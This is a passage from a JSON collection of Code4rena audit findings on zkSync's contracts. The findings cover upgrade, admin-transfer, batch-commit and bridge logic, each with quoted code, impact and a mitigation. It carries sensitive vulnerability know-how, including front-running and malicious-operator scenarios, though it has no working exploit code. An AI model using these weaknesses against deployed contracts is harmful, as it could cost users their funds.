(proposedUpgrade))\n        });\n\n        IAdmin(_chainContract).executeUpgrade(cutData);\n        emit SetChainIdUpgrade(_chainContract, l2ProtocolUpgradeTx, protocolVersion);\n    }\n```\n\nConsidering this is the logic, for setting chain upgrades, what to note here is the setting applied to the `ProposedUpgrade` struct, navigating here https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L14-L40, we can see all the necessities, attached to this struct, i.e most members of the struct are to kept as `0` in order not to be updated which is rightly, but the logic for `upgradeTimestamp` and `newProtocolVersion` is wrong.\n\nFor `upgradeTimestamp`, this value should be set as the timestamp after which the upgrade can be executed, i.e in the future or at least it shouldn't be hardcoded to `0`.\n\nFor `newProtocolVersion` the version needs to be greater than the previous protocol version, but execution instead just queries the current version which is wrong, since [the attempt to upgrade the version from BaseZkSyncUpgrade.sol would revert](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L238-L241) if the version is not greater than the current one.\n\nAdditionally note that this comment: \"Note, that the priority operation id is used as \"nonce\" for L1->L2 transactions\" in this case is invalid as the operation is not a `PRIORITY_OPERATION_L2_TX_TYPE` but rather a `SYSTEM_UPGRADE_L2_TX_TYPE`.\n\n### Impact\n\nThe logic of having an upgrade be scheduled in the future is non-existent, due to the hardcodes, upgrading all upgrades are automatically immediately possible contrary to protocol's intention, this is also heavily dependent on the documentations around this, as generally for `GenesisUpgrade`, the upgradeTimestamp 0 is an ok value, as it can and should be executed immediately after chain genesis, but that's not the case for all instances\n\n### Recommended Mitigation Steps\n\nConsider allowing `upgradeTimestamp` to be set to a different value other than `0`, additionally consider allowing `protocolVersion` to be a passed in value.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33206",
      "title": "[14] Missing getter functions for key internal `ZkSyncStateTransitionStorage` variables should be introduced",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at the getter facet here: https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Getters.sol\n\nNow, consider the `ZkSyncStateTransitionStorage` struct here: https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/ZkSyncStateTransitionStorage.sol#L66-L153\n\nGoing through both code snippets, one can see that where as there are multiple getter functions a few are missing, to list them:\n\n1. `__DEPRECATED_diamondCutStorage`\n2. `__DEPRECATED_governor`\n3. `__DEPRECATED_pendingGovernor`\n4. `__DEPRECATED_allowList`\n5. `UpgradeStorage __DEPRECATED_upgrades`\n6. `__DEPRECATED_lastWithdrawalLimitReset`\n7. `__DEPRECATED_withdrawnAmountInWindow`\n8. `mapping(address => uint256) __DEPRECATED_totalDepositedAmountPerUser`\n9. `bool zkPorterIsAvailable`\n10. `address blobVersionedHashRetriever`\n11. `uint256 chainId`\n\nNow where as one can say it's arguable not to attache getters for the deprecated variables, we can't say that for the non-deprecated ones.\n\n### Impact\n\nUsers can't directly query important state data.\n\n### Recommended Mitigation Steps\n\nConsider adding corresponding getter functions in `Getters.sol` for the nondeprecated storage data.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33205",
      "title": "[13] Protocol does not consider EIP-4844 and still assumes more than one batch can be committed",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L215-L306\n\n```solidity\n    function _commitBatches(\n        StoredBatchInfo memory _lastCommittedBatchData,\n        CommitBatchInfo[] calldata _newBatchesData\n    ) internal {\n        //omitted for brevity\n        //@audit\n        // With the new changes for EIP-4844, namely the restriction on number of blobs per block, we only allow for a single batch to be committed at a time.\n        require(_newBatchesData.length == 1, \"e4\");\n        // Check that we commit batches after last committed batch\n        require(s.storedBatchHashes[s.totalBatchesCommitted] == _hashStoredBatchInfo(_lastCommittedBatchData), \"i\"); // incorrect previous batch data\n\n        bytes32 systemContractsUpgradeTxHash = s.l2SystemContractsUpgradeTxHash;\n        // Upgrades are rarely done so we optimize a case with no active system contracts upgrade.\n        if (systemContractsUpgradeTxHash == bytes32(0) || s.l2SystemContractsUpgradeBatchNumber != 0) {\n            _commitBatchesWithoutSystemContractsUpgrade(_lastCommittedBatchData, _newBatchesData);\n        } else {\n            _commitBatchesWithSystemContractsUpgrade(\n                _lastCommittedBatchData,\n                _newBatchesData,\n                systemContractsUpgradeTxHash\n            );\n        }\n\n        s.totalBatchesCommitted = s.totalBatchesCommitted + _newBatchesData.length;\n    }\n\n\n    function _commitBatchesWithoutSystemContractsUpgrade(\n        StoredBatchInfo memory _lastCommittedBatchData,\n        CommitBatchInfo[] calldata _newBatchesData\n    ) internal {\n        //omitted for brevity\n        //@audit\n        for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {\n            _lastCommittedBatchData = _commitOneBatch(_lastCommittedBatchData, _newBatchesData[i], bytes32(0));\n\n            s.storedBatchHashes[_lastCommittedBatchData.batchNumber] = _hashStoredBatchInfo(_lastCommittedBatchData);\n            emit BlockCommit(\n                _lastCommittedBatchData.batchNumber,\n                _lastCommittedBatchData.batchHash,\n                _lastCommittedBatchData.commitment\n            );\n        }\n    }\n\n\n    function _commitBatchesWithSystemContractsUpgrade(\n        StoredBatchInfo memory _lastCommittedBatchData,\n        CommitBatchInfo[] calldata _newBatchesData,\n        bytes32 _systemContractUpgradeTxHash\n    ) internal {\n        //omitted for brevity\n        //@audit\n        for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {\n            // The upgrade transaction must only be included in the first batch.\n            bytes32 expectedUpgradeTxHash = i == 0 ? _systemContractUpgradeTxHash : bytes32(0);\n            _lastCommittedBatchData = _commitOneBatch(\n                _lastCommittedBatchData,\n                _newBatchesData[i],\n                expectedUpgradeTxHash\n            );\n\n            s.storedBatchHashes[_lastCommittedBatchData.batchNumber] = _hashStoredBatchInfo(_lastCommittedBatchData);\n            emit BlockCommit(\n                _lastCommittedBatchData.batchNumber,\n                _lastCommittedBatchData.batchHash,\n                _lastCommittedBatchData.commitment\n            );\n        }\n    }\n\n```\n\nNow these functions are called whenever batches are to be committed, now post the EIP-4844 implementation, due to the restriction on number of blobs per block, protocol can only allow for a single batch to be committed at a time, which is clearly noted in `_commitBatches()` case here is that both `_commitBatchesWithoutSystemContractsUpgrade()` and `_commitBatchesWithSystemContractsUpgrade()` still attempt to loop through the `newBatchesData.length` which is already hardcoded and can only be one.\n\n### Impact\n\nConfusing code implementation, residue code from pre EIP-4844 implementation still present in code, post `EIP-4844` implementation.\n\n### Recommended Mitigation Steps\n\nRemove the for loops in both functions.\n\n### Additional Note\n\nThis bug is also present in this instance below: https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/ValidatorTimelock.sol#L107-L142\n\n```solidity\n\n    function commitBatches(\n        StoredBatchInfo calldata,\n        CommitBatchInfo[] calldata _newBatchesData\n    ) external onlyValidator(ERA_CHAIN_ID) {\n        unchecked {\n            // This contract is only a temporary solution, that hopefully will be disabled until 2106 year, so...\n            // It is safe to cast.\n            uint32 timestamp = uint32(block.timestamp);\n            for (uint256 i = 0; i < _newBatchesData.length; ++i) {\n                committedBatchTimestamp[ERA_CHAIN_ID].set(_newBatchesData[i].batchNumber, timestamp);\n            }\n        }\n\n        _propagateToZkSyncStateTransition(ERA_CHAIN_ID);\n    }\n\n    /// @dev Records the timestamp for all provided committed batches and make\n    /// a call to the hyperchain diamond contract with the same calldata.\n    function commitBatchesSharedBridge(\n        uint256 _chainId,\n        StoredBatchInfo calldata,\n        CommitBatchInfo[] calldata _newBatchesData\n    ) external onlyValidator(_chainId) {\n        unchecked {\n            // This contract is only a temporary solution, that hopefully will be disabled until 2106 year, so...\n            // It is safe to cast.\n            uint32 timestamp = uint32(block.timestamp);\n            for (uint256 i = 0; i < _newBatchesData.length; ++i) {\n                committedBatchTimestamp[_chainId].set(_newBatchesData[i].batchNumber, timestamp);\n            }\n        }\n\n        _propagateToZkSyncStateTransition(_chainId);\n    }\n\n```\n\nAnd https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/ValidatorTimelock.sol#L180-L222\n\n```solidity\n    /// @dev Check that batches were committed at least X time ago and\n    /// make a call to the hyperchain diamond contract with the same calldata.\n    function executeBatches(StoredBatchInfo[] calldata _newBatchesData) external onlyValidator(ERA_CHAIN_ID) {\n        uint256 delay = executionDelay; // uint32\n        unchecked {\n            for (uint256 i = 0; i < _newBatchesData.length; ++i) {\n                uint256 commitBatchTimestamp = committedBatchTimestamp[ERA_CHAIN_ID].get(\n                    _newBatchesData[i].batchNumber\n                );\n\n                // Note: if the `commitBatchTimestamp` is zero, that means either:\n                // * The batch was committed, but not through this contract.\n                // * The batch wasn't committed at all, so execution will fail in the zkSync contract.\n                // We allow executing such batches.\n\n                require(block.timestamp >= commitBatchTimestamp + delay, \"5c\"); // The delay is not passed\n            }\n        }\n        _propagateToZkSyncStateTransition(ERA_CHAIN_ID);\n    }\n\n    /// @dev Check that batches were committed at least X time ago and\n    /// make a call to the hyperchain diamond contract with the same calldata.\n    function executeBatchesSharedBridge(\n        uint256 _chainId,\n        StoredBatchInfo[] calldata _newBatchesData\n    ) external onlyValidator(_chainId) {\n        uint256 delay = executionDelay; // uint32\n        unchecked {\n            for (uint256 i = 0; i < _newBatchesData.length; ++i) {\n                uint256 commitBatchTimestamp = committedBatchTimestamp[_chainId].get(_newBatchesData[i].batchNumber);\n\n                // Note: if the `commitBatchTimestamp` is zero, that means either:\n                // * The batch was committed, but not through this contract.\n                // * The batch wasn't committed at all, so execution will fail in the zkSync contract.\n                // We allow executing such batches.\n\n                require(block.timestamp >= commitBatchTimestamp + delay, \"5c\"); // The delay is not passed\n            }\n        }\n        _propagateToZkSyncStateTransition(_chainId);\n    }\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33204",
      "title": "[12] If the pending admin becomes malicious there is no specific way to stop them from accepting the admin",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L22-L42\n\n```solidity\n    /// @inheritdoc IAdmin\n    function setPendingAdmin(address _newPendingAdmin) external onlyAdmin {\n        // Save previous value into the stack to put it into the event later\n        address oldPendingAdmin = s.pendingAdmin;\n        // Change pending admin\n        s.pendingAdmin = _newPendingAdmin;\n        emit NewPendingAdmin(oldPendingAdmin, _newPendingAdmin);\n    }\n\n    /// @inheritdoc IAdmin\n    function acceptAdmin() external {\n        address pendingAdmin = s.pendingAdmin;\n        require(msg.sender == pendingAdmin, \"n4\"); // Only proposed by current admin address can claim the admin rights\n\n        address previousAdmin = s.admin;\n        s.admin = pendingAdmin;\n        delete s.pendingAdmin;\n\n        emit NewPendingAdmin(pendingAdmin, address(0));\n        emit NewAdmin(previousAdmin, pendingAdmin);\n    }\n```\n\nBoth functions are all used in the logic to update the admins.\n\nNow consider this scenario:\n\n- Current admin sets a new pending admin\n- After a few days, current admin found out that pending admin is malicious (or even maybe a wrong address, i.e current admin made a mistake to set a wrong address as pending admin)\n- Current admin now attempts to update the pending admin with a new fresh pending admin\n- Current pending admin sees the transaction and then front runs it by accepting the admin status\n\n### Impact\n\nLow, since this overall depends on the current admin setting an address that could become malicious as the pending admin (or a wrong address)\n\n### Recommended Mitigation Steps\n\nConsider implementing timelocks to the whole logic, i.e if pending admin does not accept their admin status in 1 day, it should be automatically revoked.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33203",
      "title": "[11] Users funds could still be stuck due to lack of access to `ETH` on the `L2` through `L1->L2 `transactions so this should be clearly documented",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L258-L286\n\n```solidity\n    function _requestL2Transaction(\n        uint256 _mintValue,\n        WritePriorityOpParams memory _params,\n        bytes memory _calldata,\n        bytes[] memory _factoryDeps\n    ) internal returns (bytes32 canonicalTxHash) {\n        require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, \"uj\");\n        _params.txId = s.priorityQueue.getTotalPriorityTxs();\n\n        // Checking that the user provided enough ether to pay for the transaction.\n        // Using a new scope to prevent \"stack too deep\" error\n\n        _params.l2GasPrice = _deriveL2GasPrice(tx.gasprice, _params.l2GasPricePerPubdata);\n        uint256 baseCost = _params.l2GasPrice * _params.l2GasLimit;\n        //@audit\n        require(_mintValue >= baseCost + _params.l2Value, \"mv\"); // The `msg.value` doesn't cover the transaction cost\n\n        // If the `_refundRecipient` is not provided, we use the `_sender` as the recipient.\n        address refundRecipient = _params.refundRecipient == address(0) ? _params.sender : _params.refundRecipient;\n        // If the `_refundRecipient` is a smart contract, we apply the L1 to L2 alias to prevent foot guns.\n        if (refundRecipient.code.length > 0) {\n            refundRecipient = AddressAliasHelper.applyL1ToL2Alias(refundRecipient);\n        }\n        _params.refundRecipient = refundRecipient;\n\n        // populate missing fields\n        _params.expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast\n        _params.valueToMint = _mintValue;\n\n        canonicalTxHash = _writePriorityOp(_params, _calldata, _factoryDeps);\n    }\n```\n\nThis function eventually gets called when requesting transactions from the L2, note that there is an enforcement that `mintVaue` is always larger than `baseCost + _params.l2Value`, note that from [here](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L283-L286) we can see that the msg.value of the L1->L2 transaction must only be part of ETH to be minted inside of transaction processing on the L2, the same thing can be [confirmed in the bootloader](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L1818-L1822)\n\nNow, the [DefaultAccount.sol mistakenly assumes that L1->L2 transactions initiated by external owned accounts (EOAs) provide all necessary functionality](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/DefaultAccount.sol#L118-L127), leading to its `executeTransactionFromOutside()` function being left unimplemented.\n\nThis oversight means users cannot access their ETH on L2 if a malicious operator selectively processes only L1->L2 transactions. This scenario not only restricts access to ETH on L2 but also breaches the security principle that guarantees users can initiate transactions from L1 to L2, enabling them to withdraw their assets in anticipation of a potentially harmful upgrade.\n\n### Impact\n\n- Users cannot access their L2 ETH if the operator acts maliciously.\n- Compromises the security guarantee that allows fund withdrawals before executing a malicious upgrade.\n\n> NB: Submitting as QA cause whereas sponsors \"confirmed\" this bug from the previous audit, they tagged it as a `disagree with severity`... but still of the opinion that this is a borderline medium severity bug and leaving at the discretion of the judge.\n\n### Recommended Mitigation Steps\n\nEnable the creation of L1->L2 transactions that can draw upon ETH in the L2 balance as part of the transaction value. Alternatively, implement functionality in the `DefaultAccount::executeTransactionFromOutside` function to ensure it operates as initially intended or this should be clearly documented\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33202",
      "title": "[10] Consider renaming `CURRENT_MAX_PRECOMPILE_ADDRESS` to `MAX_POSSIBLE_PRECOMPILE_ADDRESS`",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/Constants.sol#L43-L47\n\n```solidity\n/// @dev The maximal possible address of an L1-like precompie. These precompiles maintain the following properties:\n/// - Their extcodehash is EMPTY_STRING_KECCAK\n/// - Their extcodesize is 0 despite having a bytecode formally deployed there.\nuint256 constant CURRENT_MAX_PRECOMPILE_ADDRESS = 0xff;\n\n```\n\nNote that this address is used in the`AccountCodeStorage.getCodeHash`function, i.e\n\n```solidity\naddress account = address(uint160(_input));\nif (uint160(account) <= CURRENT_MAX_PRECOMPILE_ADDRESS) {\n    return EMPTY_STRING_KECCAK;\n}\n```\n\nCase is that the current name suggests that there are 255 addresses already, where as is should mean that the maximal possible address of an L1-like precompile should be 255 as [this comment](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/Constants.sol#L43) hints.\n\n### Impact\n\nConfusing code, makes it harder to understand protocol\n\n### Recommended Mitigation Steps\n\nConsider changing `CURRENT_MAX_PRECOMPILE_ADDRESS` to `MAX_POSSIBLE_PRECOMPILE_ADDRESS`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33201",
      "title": "[09] Fix bugs present in the precomcompiles or clearly document the bugs for users/developers",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2023-10-zksync-findings/issues?q=175\n\nFocus on the primary issue and its' duplicate, they all talk about how they are behavorial inconsistencies in precompiles when they are delegate called into, with suggesting that the delegateCall() function of the EfficientCall() should be reimplemented to check if this precompiles are to be called and instead pass the call in as a staticcall, issue is that, as shown in the snippet below no change has been made to this function attached with the fact that no documentations attached to the natspec with this bug case, i.e https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/libraries/EfficientCall.sol#L83-L95\n\n```solidity\n    /// @notice Perform a `delegateCall` without copying calldata to memory.\n    /// @param _gas The gas to use for the call.\n    /// @param _address The address to call.\n    /// @param _data The calldata to use for the call.\n    /// @return returnData The copied to memory return data.\n    function delegateCall(\n        uint256 _gas,\n        address _address,\n        bytes calldata _data\n    ) internal returns (bytes memory returnData) {\n        bool success = rawDelegateCall(_gas, _address, _data);\n        returnData = _verifyCallResult(success);\n    }\n```\n\n### Impact\n\nDeviation from the EVM's precompile method\n\n### Recommended Mitigation Steps\n\nConsider clearly documenting ths bug case and inform users to not attempt calling it via delegate call or apply the suggested fixes of first checking if the contracts to be called are the precompiles and then `staticcall` them.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33200",
      "title": "[08] Shadow upgrades would currently have their executional data leaked if they fail",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/governance/IGovernance.sol#L21-L40\n\n```solidity\nstruct Call {\n    address target;\n    uint256 value;\n    bytes data;\n}\nstruct Operation {\n    Call[] calls;\n    bytes32 predecessor;\n    bytes32 salt;\n}\n```\n\nThe above represents both the struct used for calls made during an operation and how how an operation is being defined.\n\nFrom [here](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/governance/Governance.sol#L142-L145), we can see that protocol implements a logic for shadow upgrades.\n\nNote that these types of upgrades are designed to keep upgrade details confidential until execution. However, if an upgrade attempt fails, the information within the `Operation calldata _operation` parameter, which is bundled with the call specifics via [execute()](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/governance/Governance.sol#L168-L182), becomes public.\n\n### Impact\n\nA failed shadow upgrade unintentionally exposes critical upgrade details to the public, which can include sensitive call data and operational parameters. Malicious actors could exploit this information to discover system vulnerabilities and mount attacks before the deployment of a security patch, note that the current upgrade to the `Governance.sol` even marks these functions (i.e execute() & executeInstant() ) as payable, which suggests that now native token values could be attached to this window.\n\n### Recommended Mitigation Steps\n\nEnforce a protective mechanism that automatically puts the system in a freeze mode upon failure.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33199",
      "title": "[07] Protocol is susceptible to synchronizing issues cause reverted system contract upgrade batches must stiill be committed between L1 and L2 upgrades due to wrongly assuming just reverting in the bootloader is enough",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nCurrently, either `upgrade()` function of [BaseZkSyncUpgrade](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L67C1-L88C6) and [BaseZkSyncUpgradeGenesis](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgradeGenesis.sol#L47C3-L68C6) is called depending on the context of the current upgrade.\n\nConsidering `BaseZkSyncUpgrade` we can see that [`BaseZkSyncUpgrade::upgrade()` eventually calls `_setL2SystemContractUpgrade()`](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L79) to pass on the data for the proposed upgrade\n\n```solidity\n        txHash = _setL2SystemContractUpgrade(\n            _proposedUpgrade.l2ProtocolUpgradeTx,\n            _proposedUpgrade.factoryDeps,\n            _proposedUpgrade.newProtocolVersion\n        );\n```\n\nConsidering it's an upgrade transaction, this transaction should be executed on L2 with` _l2ProtocolUpgradeTx.txType = 254`. In the bootloader, i.e https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L594-L612\n\n```yul\n                    case 254 {\n                        // This is an upgrade transaction.\n                        // Protocol upgrade transactions are processed totally in the same manner as the normal L1->L2 transactions,\n                        // the only difference are:\n                        // - They must be the first one in the batch\n                        // - They have a different type to prevent tx hash collisions and preserve the expectation that the\n                        // L1->L2 transactions have priorityTxId inside them.\n                        if transactionIndex {\n                            assertionError(\"Protocol upgrade tx not first\")\n                        }\n\n                        // This is to be called in the event that the L1 Transaction is a protocol upgrade txn.\n                        // Since this is upgrade transactions, we are okay that the gasUsed by the transaction will\n                        // not cover this additional hash computation\n                        let canonicalL1TxHash := getCanonicalL1TxHash(txDataOffset)\n                        sendToL1Native(true, protocolUpgradeTxHashKey(), canonicalL1TxHash)\n                        //@audit\n                        processL1Tx(txDataOffset, resultPtr, transactionIndex, userProvidedPubdataPrice, false)\n                    }\n```\n\nNow during the current execution, [if for any reason this attempt fails, say the execution runs out of gas, the execution reverts](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/bootloader/bootloader.yul#L1010-L1015), which is a direct fix to the **primary issue** from the previous audits, i.e https://github.com/code-423n4/2023-10-zksync-findings/issues/214#issuecomment-1795027489, but this is not enough fix to ensure that the synchronization is always in play.\n\nConsider [these issues](https://github.com/code-423n4/2023-10-zksync-findings/issues?q=label%3Aduplicate-214+is%3Aclosed) that were duplicated to the aforementioned due to having a similar logic, most especially [1](https://github.com/code-423n4/2023-10-zksync-findings/issues?q=is%3Aissue+No+way+of+preventing+the+upgrade+from+happening+even+if+it+has+a+critical+vulnerability+is%3Aclosed) & [2](https://github.com/code-423n4/2023-10-zksync-findings/issues?q=is%3Aissue+if+a+batch+committed+with+system+contract+upgrades+is+reverted+via+revertBatches%28%29+to+prevent+execution+of+that+batch%2C+new+batches+intended+to+be+committed+with+no+system+contract+upgrades+will+be+committed+as+batches+with+system+contract+upgrades.+is%3Aclosed).\n\nIn short, for [1](https://github.com/code-423n4/2023-10-zksync-findings/issues?q=is%3Aissue+No+way+of+preventing+the+upgrade+from+happening+even+if+it+has+a+critical+vulnerability+is%3Aclosed) the bug report is about, whenever an upgrade has a criticial vulnerabilty, current implementation does not provide a possibility of preventing the upgrade to go on, cause the upgrade must be carried out and cannot be changed even if batches get reverted.\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L472-L497\n\n```solidity\n    function revertBatches(uint256 _newLastBatch) external nonReentrant onlyValidatorOrStateTransitionManager {\n        _revertBatches(_newLastBatch);\n    }\n\n\n    /// @inheritdoc IExecutor\n    function revertBatchesSharedBridge(uint256, uint256 _newLastBatch) external nonReentrant onlyValidator {\n        _revertBatches(_newLastBatch);\n    }\n\n\n    function _revertBatches(uint256 _newLastBatch) internal {\n        require(s.totalBatchesCommitted > _newLastBatch, \"v1\"); // The last committed batch is less than new last batch\n        require(_newLastBatch >= s.totalBatchesExecuted, \"v2\"); // Already executed batches cannot be reverted\n\n\n        if (_newLastBatch < s.totalBatchesVerified) {\n            s.totalBatchesVerified = _newLastBatch;\n        }\n        s.totalBatchesCommitted = _newLastBatch;\n\n\n        // Reset the batch number of the executed system contracts upgrade transaction if the batch\n        // where the system contracts upgrade was committed is among the reverted batches.\n        if (s.l2SystemContractsUpgradeBatchNumber > _newLastBatch) {\n            delete s.l2SystemContractsUpgradeBatchNumber;\n        }\n\n\n        emit BlocksRevert(s.totalBatchesCommitted, s.totalBatchesVerified, s.totalBatchesExecuted);\n    }\n```\n\nEvidently, one can see that the suggested fix from the report has not been implemented, i.e while reverting the upgrade tx the `s.l2SystemContractsUpgradeTxHash` is not provided again to prevent the error inorder to increase the robustness of the system, that's to say for cases like this, the team would then not have time to prevent the upgrade from happening, fix the error, and make an upgrade tx again rather than leaving the vulnerable upgrade in the wild and not being implemented.\n\nBug flow should be seen from the [attached report](https://github.com/code-423n4/2023-10-zksync-findings/issues?q=is%3Aissue+No+way+of+preventing+the+upgrade+from+happening+even+if+it+has+a+critical+vulnerability+is%3Aclosed), now the protocol's plan to solve this is by overriding `s.l2SystemContractsUpgradeTxHash` in order to cancel the buggy upgrade, but this wouldn't work, cause that upgrade [must be carried out in the next batch](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/docs/Smart%20contract%20Section/Handling%20L1%E2%86%92L2%20ops%20on%20zkSync.md?plain=1#L59-L65), so it gives zero time for protocol to code and then even deploy the new upgrader, now within this time frame, an attacker aware of the bugs in the implementation can exploit the system.\n\nFor case [2](https://github.com/code-423n4/2023-10-zksync-findings/issues?q=is%3Aissue+if+a+batch+committed+with+system+contract+upgrades+is+reverted+via+revertBatches%28%29+to+prevent+execution+of+that+batch%2C+new+batches+intended+to+be+committed+with+no+system+contract+upgrades+will+be+committed+as+batches+with+system+contract+upgrades.+is%3Aclosed), the core of the issue is the same, i.e it lies in the protocol's failure to delete the transaction hash associated with a system contract upgrade when reverting a batch. This leads to a scenario where subsequent batches, even those not intended to include a system contract upgrade, are processed as if they do, due to the presence of the leftover upgrade transaction hash. This misprocessing causes unintended execution of system contract upgrades or reverts due to mismatched expectations about the batch's content.\n\nNow, the protocol's design allows for the reverting of batches to undo changes not yet executed. However as previously highlighted, it inadequately addresses the cleanup of system contract upgrade markers, specifically the transaction hash (`s.l2SystemContractsUpgradeTxHash`). While it resets the batch number indicating an upgrade (`s.l2SystemContractsUpgradeBatchNumber`), it neglects the corresponding transaction hash. This leads to confusion in the `_commitBatches()` function, take a look at this https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L215-L248\n\n```solidity\n    function _commitBatches(\n        StoredBatchInfo memory _lastCommittedBatchData,\n        CommitBatchInfo[] calldata _newBatchesData\n    ) internal {\n        // check that we have the right protocol version\n        // three comments:\n        // 1. A chain has to keep their protocol version up to date, as processing a block requires the latest or previous protocol version\n        // to solve this we will need to add the feature to create batches with only the protocol upgrade tx, without any other txs.\n        // 2. A 